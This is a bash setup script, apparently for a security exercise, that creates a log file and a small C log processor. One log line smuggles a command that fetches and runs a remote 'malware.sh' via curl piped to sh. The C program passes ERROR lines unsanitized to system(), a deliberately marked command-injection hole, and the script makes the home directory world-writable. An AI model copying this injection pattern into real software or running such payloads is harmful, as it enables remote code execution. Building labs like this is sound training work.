#!/bin/bash
set -e
export DEBIAN_FRONTEND=noninteractive
apt-get update && apt-get install -y python3 python3-pip gcc libc6-dev
pip3 install pytest

mkdir -p /home/user

cat << 'EOF' > /home/user/web.log
[2023-10-25 09:55:12] INFO: System startup complete.
[2023-10-25 09:58:33] WARNING: High memory usage detected.
[2023-10-25 10:05:00] ERROR: Failed to connect to database.
[2023-10-25 10:12:45] INFO: User admin logged in successfully.
[2023-10-25 10:15:20] ERROR: User login failed'; curl http://198.51.100.44/malware.sh | sh; echo '
[2023-10-25 10:20:00] INFO: Daily backup initiated.
EOF

cat << 'EOF' > /home/user/logd.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main() {
    FILE *fp = fopen("/home/user/web.log", "r");
    if (!fp) {
        perror("Failed to open log file");
        return 1;
    }

    char line[512];
    while (fgets(line, sizeof(line), fp)) {
        line[strcspn(line, "\n")] = 0;

        // Only process ERROR logs
        if (strstr(line, "ERROR")) {
            char cmd[1024];
            // VULNERABILITY: Command Injection via unsanitized input
            sprintf(cmd, "echo '%s' >> /home/user/alerts.log", line);
            system(cmd);
        }
    }

    fclose(fp);
    return 0;
}
EOF

useradd -m -s /bin/bash user || true
chmod -R 777 /home/user
